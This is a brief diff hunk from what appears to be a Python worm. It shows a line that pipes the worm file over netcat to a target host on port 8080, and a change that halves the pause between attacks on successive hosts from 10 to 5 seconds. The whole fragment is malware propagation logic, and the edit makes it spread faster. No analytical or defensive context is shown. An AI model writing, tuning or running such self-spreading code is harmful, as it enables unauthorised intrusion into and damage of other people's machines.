@@ -147,5 +147,5 @@ while True:
     # Send the worm to the target host
     subprocess.run([f"cat /home/worm.py | nc -w5 {targetIP} 8080"], shell=True)
 
-    # Sleep for 10 seconds before attacking another host
-    time.sleep(10) 
+    # Sleep for 5 seconds before attacking another host
+    time.sleep(5) 
